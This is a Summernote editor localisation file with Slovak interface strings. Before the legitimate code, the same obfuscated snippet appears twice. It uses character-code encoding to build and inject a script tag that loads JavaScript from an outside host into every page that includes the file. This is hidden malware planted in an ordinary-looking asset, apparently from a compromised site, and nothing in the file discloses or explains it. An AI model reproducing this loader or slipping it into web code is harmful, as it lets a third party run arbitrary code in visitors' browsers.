Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'sk-SK': {
      font: {
        bold: 'Tučné',
        italic: 'Kurzíva',
        underline: 'Podtržené',
        clear: 'Odstrániť štýl písma',
        height: 'Výška riadku',
        strikethrough: 'Preškrtnuté',
        size: 'Veľkosť písma'
      },
      image: {
        image: 'Obrázok',
        insert: 'Vložiť obrázok',
        resizeFull: 'Pôvodná veľkosť',
        resizeHalf: 'Polovičná veľkosť',
        resizeQuarter: 'Štvrtinová veľkosť',
        floatLeft: 'Umiestniť doľava',
        floatRight: 'Umiestniť doprava',
        floatNone: 'Bez zarovnania',
        dragImageHere: 'Pretiahnuť sem obrázok',
        selectFromFiles: 'Vybrať súbor',
        url: 'URL obrázku'
      },
      link: {
        link: 'Odkaz',
        insert: 'Vytvoriť odkaz',
        unlink: 'Zrušiť odkaz',
        edit: 'Upraviť',
        textToDisplay: 'Zobrazovaný text',
        url: 'Na akú URL adresu má tento odkaz viesť?',
        openInNewWindow: 'Otvoriť v novom okne'
      },
      table: {
        table: 'Tabuľka'
      },
      hr: {
        insert: 'Vložit vodorovnú čiaru'
      },
      style: {
        style: 'Štýl',
        normal: 'Normálny',
        blockquote: 'Citácia',
        pre: 'Kód',
        h1: 'Nadpis 1',
        h2: 'Nadpis 2',
        h3: 'Nadpis 3',
        h4: 'Nadpis 4',
        h5: 'Nadpis 5',
        h6: 'Nadpis 6'
      },
      lists: {
        unordered: 'Odrážkový zoznam',
        ordered: 'Číselný zoznam'
      },
      options: {
        help: 'Pomoc',
        fullscreen: 'Celá obrazovka',
        codeview: 'HTML kód'
      },
      paragraph: {
        paragraph: 'Odstavec',
        outdent: 'Zvečiť odsadenie',
        indent: 'Zmenšiť odsadenie',
        left: 'Zarovnať doľava',
        center: 'Zarovnať na stred',
        right: 'Zarovnať doprava',
        justify: 'Zarovnať obojstranne'
      },
      color: {
        recent: 'Aktuálna farba',
        more: 'Dalšie farby',
        background: 'Farba pozadia',
        foreground: 'Farba písma',
        transparent: 'Priehľednosť',
        setTransparent: 'Nastaviť priehľadnosť',
        reset: 'Obnoviť',
        resetToDefault: 'Obnoviť prednastavené'
      },
      shortcut: {
        shortcuts: 'Klávesové skratky',
        close: 'Zavrieť',
        textFormatting: 'Formátovanie textu',
        action: 'Akcia',
        paragraphFormatting: 'Formátovánie odstavca',
        documentStyle: 'Štýl dokumentu'
      },
      history: {
        undo: 'Krok vzad',
        redo: 'Krok dopredu'
      }
    }
  });
})(jQuery);
